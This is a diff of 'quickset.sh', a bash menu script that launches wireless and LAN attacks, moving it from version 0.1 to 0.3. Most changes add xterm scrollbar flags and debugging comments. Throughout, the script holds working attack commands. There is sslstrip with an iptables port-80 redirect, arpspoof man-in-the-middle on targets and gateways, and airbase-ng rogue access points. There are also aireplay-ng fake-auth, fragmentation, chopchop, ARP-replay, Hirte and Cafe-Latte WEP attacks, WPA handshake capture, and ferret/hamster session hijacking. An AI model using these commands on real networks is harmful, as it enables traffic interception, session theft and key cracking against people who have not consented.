@@ -3,7 +3,7 @@ function head()
 {
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: quickset.sh
-## Version: 0.1
+## Version: 0.3
 ## Copyright (C) <2009>  <Snafu>
 
 ##  This program is free software: you can redistribute it and/or modify
@@ -52,28 +52,23 @@ function head()
 ## Simple hack is history | tail -n 2 | head -n 1
 ## Need to figure how to "Awk Out" things... [^abc] negates abc..but how to implement....
 
-## Have received the below errors when using hostname -v...  Should be a matter of finding everywhere the hostname is called and adjusting from there...
-## _IceTransSocketUNIXConnect: Cannot connect to non-local host bt (x2)
-## Warning: Tried to connect to session manager, Could not open network socket
-
 ## WOULD LIKE TO IMPLEMENT MORE FAST ACTING ATTACK TOOLS THAT REQUIRE LITTLE TO NO SETUP.  If you have a tool you would like added to this script please contact me
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-## don't know if pforge will append on the end of arp-request file...if not I will make pforge_c and pforge_f -or- result to a file via arp-request=$(date +"-%b-%d-%y-%H%M%S"_arp); foo=$arp-request
+### don't know if pforge will append on the end of arp-request file...if not I will make pforge_c and pforge_f -or- result to a file via arp-request=$(date +"-%b-%d-%y-%H%M%S"_arp); foo=$arp-request
 
-## Need to investigate the "subject" of Hirte AP....  Should this not be a Router attack??
+### Need to investigate the "subject" of Hirte AP....  Should this not be a Router attack??
 
-## Should managed mode channel match monitor mode channel????????
+### Should managed mode channel match monitor mode channel????????
 
-## Tail a log for who has connected via dhcp -cf??
+### Tail a log for who has connected to the dhcp server
 
-## 1800 or 1500 MTUs (Need to test this with "real" internet)
+### Figure out if old PIDs are used during a cycle...if not we'll do PID assignments to ensure kill -9s
+### Use PIDs to make a greppable list
 
-## Figure out if old PIDs are used during a cycle...if not we'll do PID assignments to ensure kill -9s
-
-## Find out if there is a way to add a scrollbar on xterm sessions
+### Sanitize available devices?
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -85,11 +80,20 @@ function head()
 
 ## $var is a recycled variable throughout the script
 
-## On 21 September, I matched the MTUs for the routing portions; this FINALLY made it to where the iPhone could connect....!
+## On 21 September, I matched the MTUs for the routing portions; this FINALLY made it to where the iPhone could connect....!  Part of the problem had been that I was trying to go with a rather high MTU 1800.....This is not recommended as the default for a LAN is 1500, I believe that the fragmentation resulting from the 1800 caused the failures.
 
 ## One of the tougher parts of designing this script was weighing in on which programs to include, originally I had decided to implement a KarMetasploit attack.  I later decided against it; instead deciding to focus on smaller programs; with the thought concept that this script is not meant to be an all encompassing tool, but one designed to setup "Quick Fixes".....
 
-## On 4 October I encountered the most difficult situation yet.  For some reason, BASH does not like certain combinations within pipes.  After 3 hours of trying every combination I could come up with, I finally was able to make a randomizer for a NIC in monitor mode.  Hindsight 20/20 the solution was simple, but it took every ounce of patience I had to keep pursuing the end goal.  This just shows how much dedication really pays off if you want something bad enough... 
+
+## On 4 October I encountered the most difficult situation yet.  For some reason, BASH does not like certain combinations within pipes.  After 3 hours of trying every combination I could come up with, I finally was able to make a randomizer for a NIC in monitor mode that would match the physical device with the virtual one.
+
+## rand_mac=`ifconfig $mac_dev | awk '{print $5}'` && rand_mac=`echo $rand_mac | awk '{print $1}'` (Works)
+## -versus-
+## ifconfig $mac_dev | grep HWaddr | awk '{print $5} (Failed to work
+
+## I have no idea why the later command failed to work, I will investigate this later on.
+
+## Hindsight 20/20 the solution was simple, but it took every ounce of patience I had to keep pursuing the end goal.  This just shows how much dedication really pays off if you want something bad enough... 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -100,15 +104,30 @@ function head()
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Multiple Sticky Pots are causing issues.  This will probably affect the other two choices for SoftAPs as well.  Found via usage of completly different network settings.  This leads to a loop at the method selection.  Not a script killer, but should be addressed for learning purposes sometime in the near future.  A simple hack to prevent this bug, but not fix it would be to add a variable similar to the dhcpd cleanup function variable for use in seeing if a fake AP already exists.  After I figure out the reason behind the bug, I will decide on whether or not to allow multiple APs.
 
-## Airbase-NG is crashing during extended periods of usage.  I've noticed this when there are a lot of connections to the SoftAP.  I believe perhaps xterm is the root cause.  I will look into this later on.
+
+## Airbase-NG is crashing during extended periods of usage. There are a lot of variables to consider with this bug: nmap, ettercap, dhcp3-server, etc...
+
+## I chose to eliminate xterm as a factor by just using: (airbase-ng -c $sac -e "$SSID" $pii &) within the script, hoping for an error message.  I had previously tried a variety of methods to evoke an error message, but was unsuccessful; evidently airbase-ng doesn't like to issue them out with regards to the at0 interface
+
+## I waited a little bit for at0 to not exist anymore, and then issued <crtl+c> within the script.  The idea worked and I was given the following as output: ./quickset.sh: line 1:  1866 Segmentation fault      airbase-ng -c $sac -e "$SSID" $pii
+
+## Of course multiple things were happening when the seg fault issue arose (ettercap, nmap, normal network traffic and such that iPhones like to send out {sending personal information that you never really intended to have sent out in the first place, but that is a story all in itself}.  My next idea was to reboot and start fresh.  I followed my script all the way through the creation of the SoftAP and the DHCP server.  I then connected my iPhone and sent it pings until the interface no longer existed.  The following 3 lines are the final output statistics before I stopped the ping.
+
+## --- 192.168.10.100 ping statistics ---
+## 1103 packets transmitted, 688 received, +1 duplicates, 37% packet loss, time 1106321ms
+## rtt min/avg/max/mdev = 3.402/6.487/12.889/0.974 ms
+
+## My next step will be to try this on Lucid Lynx since it is roughly the same
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## First and foremost, to God above for giving me the abilities I have, Amen.
 
-## Credit for my scripting style to carlos_perez@darkoperator.com
+## My scripting style is derived from carlos_perez@darkoperator.com
 ## Credit for some of the attacks in this script to him as well
+
+## Grant Pearson for having me RTFM with xterm debugging
 
 ## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -421,7 +440,7 @@ echo -e "\033[1;34m\n\n\n\n\n\n\n
 QuickSet - A Quick Way to Setup a Wired/Wireless Hack
       Author: Snafu ----> will@configitnow.com
            Read Comments Prior to Usage
-            Ver 0.1 (5 October 2011)\033[1;33m
+            Ver 0.3 (6 October 2011)\033[1;33m
 
 
         IP Forwarding via the Kernel Enabled
@@ -567,7 +586,7 @@ Come back to THIS screen to continue with the script
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 read
-xterm -bg black -fg grey -title AiroDump -e airodump-ng -f $hop $pii --channel $sc & ias_pid=$!
+xterm -bg black -fg grey -sb -rightbar -title AiroDump -e airodump-ng -f $hop $pii --channel $sc & ias_pid=$!
 rescan--
 }
 
@@ -597,7 +616,7 @@ case $var in
 	1) ferret--;;
 
 	2) if [[ -f hamster.txt ]];then
-		xterm -bg black -fg grey -title Hamster -e hamster &
+		xterm -bg black -fg grey -sb -rightbar -title Hamster -e hamster &
 	else
 		echo -e "\033[31m\n\nhamster.txt MUST exist to run hamster"
 		read
@@ -665,7 +684,7 @@ esac
 
 cleanup--()
 {
-echo -e "\033[36mPerform Cleanup of Hidden Processes? (y or n)"
+echo -e "\033[36m\nPerform Cleanup of Hidden Processes? (y or n)"
 read var
 case $var in
 	y|Y) if [[ $dhcp_svr_stat = x ]]; then
@@ -772,7 +791,7 @@ rb= ## Router BSSID
 			echo -e "\033[36m\nms between channel hops?"
 			read hop
 		done
-		xterm -bg black -fg grey -title AiroDump -e airodump-ng -f $hop $pii --channel $sc & dea_pid=$!
+		xterm -bg black -fg grey -sb -rightbar -title AiroDump -e airodump-ng -f $hop $pii --channel $sc & dea_pid=$!
 		sleep .7
 		deauth--
 		}
@@ -838,7 +857,7 @@ while [ -z $rb ];do
 done
 kill -9 $ias_pid &
 sleep .7
-xterm -bg black -fg grey -title Airodump -e airodump-ng $pii --channel $sc --bssid $rb & dea_pid=$!
+xterm -bg black -fg grey -sb -rightbar -title Airodump -e airodump-ng $pii --channel $sc --bssid $rb & dea_pid=$!
 sleep .7
 deauth_II--
 clear
@@ -910,10 +929,10 @@ ferret--()
 					1|2|3|4|5|6|7|8|9|10|11) ;;
 					*) fer_chan=6 ;;
 				esac
-				xterm -bg black -fg grey -title Ferret -e ferret -i $fer_dev --channel $fer_chan & 
+				xterm -bg black -fg grey -sb -rightbar -title Ferret -e ferret -i $fer_dev --channel $fer_chan & 
 				atk_menu--;;
 
-				y) xterm -bg black -fg grey -title Ferret -e ferret -i $fer_dev & 
+				y) xterm -bg black -fg grey -sb -rightbar -title Ferret -e ferret -i $fer_dev & 
 				atk_menu--;;
 			esac
 		fi;;
@@ -945,17 +964,17 @@ tail_log=Yes
 	{
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $lst_port
 	if [[ $lck_fav = Yes && $ses_kil = Yes ]];then
-		xterm -bg black -fg grey -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port &
+		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port &
 	elif [[ $lck_fav = Yes && $ses_kil = No ]];then
-		xterm -bg black -fg grey -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port &
+		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port &
 	elif [[ $lck_fav = No && $ses_kil = Yes ]];then
-		xterm -bg black -fg grey -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port &
+		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port &
 	else
-		xterm -bg black -fg grey -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -l $lst_port &
+		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -l $lst_port &
 	fi
 	sleep 2
 	case $tail_log in
-		Yes) xterm -bg black -fg grey -title "SSLStrip Tail" -e tail -f $sstrip_log & ;;
+		Yes) xterm -bg black -fg grey -sb -rightbar -title "SSLStrip Tail" -e tail -f $sstrip_log & ;;
 	esac
 	atk_menu--
 	}
@@ -1072,7 +1091,7 @@ while [[ $var_II != x ]];do
 	read var
 	case $var in
 		y|Y) var_II=x
-		xterm -bg black -fg grey -title "ArpSpoof Subnet" -e arpspoof -i $spoof_dev $gt_way &
+		xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Subnet" -e arpspoof -i $spoof_dev $gt_way &
 		atk_menu--;;
 
 		n|N) var_II=x 
@@ -1083,12 +1102,12 @@ while [[ $var_II != x ]];do
 			read var
 			case $var in 
 				y|Y) var_III=x 
-				xterm -bg black -fg grey -title "ArpSpoof Target" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
-				xterm -bg black -fg grey -title "ArpSpoof Gateway" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
+				xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Target" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
+				xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Gateway" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
 				atk_menu--;;
 
 				n|N) var_III=x
-				xterm -bg black -fg grey -title "ArpSpoof Target" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
+				xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Target" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
 				atk_menu--;;
 
 				*) var_III= ;;
@@ -1315,13 +1334,14 @@ ap--()
 ## blackhole targets every single probe request on current channel
 modprobe tun
 if [ $BB = 1 ]; then
-	xterm -bg black -fg grey -title "Blackhole AP" -e airbase-ng -c $sac -P -C 60 $pii &
+	xterm -bg black -fg grey -sb -rightbar -title "Blackhole AP" -e airbase-ng -c $sac -P -C 60 $pii &
 	clear
 ## bullzeye targets specified ESSID only
 elif [ $BB = 2 ]; then
 	echo -e "\033[36mDesired ESSID?"
 	read SSID
-	xterm -bg black -fg grey -title "Bullzeye AP" -e airbase-ng -c $sac -e "$SSID" $pii &
+	xterm -bg black -fg grey -sb -rightbar -title "Bullzeye AP" -e airbase-ng -c $sac -e "$SSID" $pii &
+
 	clear
 elif [ $BB = 3 ];then
 	private= ## Nulled
@@ -1332,10 +1352,10 @@ elif [ $BB = 3 ];then
 	case $var in
 		y|Y) echo -e "\033[36mPassword?"
 		read wep_pword
-		xterm -bg black -fg grey -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" -w $wep_pword $pii &
+		xterm -bg black -fg grey -sb -rightbar -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" -w $wep_pword $pii &
 		clear;;
 
-		n|N) xterm -bg black -fg grey -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" $pii & ;;
+		n|N) xterm -bg black -fg grey -sb -rightbar -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" $pii & ;;
 
 		*) ap--;;
 	esac
@@ -1531,7 +1551,7 @@ YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION
 
 	dump--()
 	{
-	xterm -bg black -fg grey -title AiroDump -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format pcap &
+	xterm -bg black -fg grey -sb -rightbar -title AiroDump -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format pcap &
 	}
 
 	pforge--()
@@ -1554,9 +1574,9 @@ YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION
 			echo -e "\033[36m\nEnter Hidden ESSID"
 			read hid_essid
 		done
-		xterm -bg black -fg grey -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" & ;;
+		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" & ;;
 	
-		n|N) xterm -bg black -fg grey -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm & ;;
+		n|N) xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm & ;;
 		*) auth--;;
 	esac
 	}
@@ -1842,7 +1862,7 @@ Client Technique Selection
 	}
 
 	frag_out--()
-	{ xterm -bg black -fg grey -title "Frag Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm & }
+	{ xterm -bg black -fg grey -sb -rightbar -title "Frag Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm & }
 
 ## Chop sub-functions
 	chop_gen--()
@@ -1860,15 +1880,15 @@ Client Technique Selection
 	}
 
 	chop_out--()
-	{ xterm -bg black -fg grey -title "Chop Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm & }
+	{ xterm -bg black -fg grey -sb -rightbar -title "Chop Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm & }
 
 ## ARP sub-function
 	arp_out--()
-	{ xterm -bg black -fg grey -title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm & }
+	{ xterm -bg black -fg grey -sb -rightbar -title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm & }
 
 ## -2 sub-function
 	_2_out--()
-	{ xterm -bg black -fg grey -title "-2 Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm & }
+	{ xterm -bg black -fg grey -sb -rightbar -title "-2 Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm & }
 
 ## Amplify sub-functions
 	amplify--()
@@ -2018,22 +2038,22 @@ Client Technique Selection
 	clear
 	case $ct in
 		1) orig_atk="1) Hirte (AP)"
-		xterm -bg black -fg grey -title "Hirte (AP)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 &
+		xterm -bg black -fg grey -sb -rightbar -title "Hirte (AP)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 &
 		sleep 2
 		dump--;;
 
 		2) orig_atk="2) Hirte (Ad-Hoc)"
-		xterm -bg black -fg grey -title "Hirte (Ad-Hoc)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 -A &
+		xterm -bg black -fg grey -sb -rightbar -title "Hirte (Ad-Hoc)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 -A &
 		sleep 2
 		dump--;;
 
 		3)orig_atk="3) Cafe-Latte"
-		xterm -bg black -fg grey -title Cafe-Latte -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
+		xterm -bg black -fg grey -sb -rightbar -title Cafe-Latte -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
 		sleep 2
 		dump--;;
 
 		4) orig_atk="4) Shared-Key PRGA Capture"
-		xterm -bg black -fg grey -title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
+		xterm -bg black -fg grey -sb -rightbar -title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
 		sleep 2;;
 	esac
 	st_3--
@@ -2060,14 +2080,14 @@ Client Technique Selection
 	case $spec in
 		1) case $wifu in
 			1|2|3) wpa_warn--
-			xterm -bg black -fg grey -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -F ab_$cf & wpa_pid=$! ;;
+			xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -F ab_$cf & wpa_pid=$! ;;
 
 			7|8|9) wpa_warn--
-			xterm -bg black -fg grey -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -y -F ab_$cf & wpa_pid=$! ;;
+			xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -y -F ab_$cf & wpa_pid=$! ;;
 		esac;;
 
 		2) wpa_warn--
-		xterm -bg black -fg grey -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
+		xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
 	esac
 	echo -e "\033[1;32m\nPress Enter to Exit Script Once Tgt'd Handshake has Been Captured\n"
 	read
@@ -2079,7 +2099,7 @@ Client Technique Selection
 ## wifi_101-- trap catcher
 	cleanup_101--()
 	{
-	echo -e "\033[36mKill WiFi_101 Processess Before Returning to the Main Menu? (y or n)\n"
+	echo -e "\033[36m\nKill WiFi_101 Processess Before Returning to the Main Menu? (y or n)"
 	read kill_wifi
 	case $kill_wifi in
 		y|Y) echo -e "\033[1;33m"
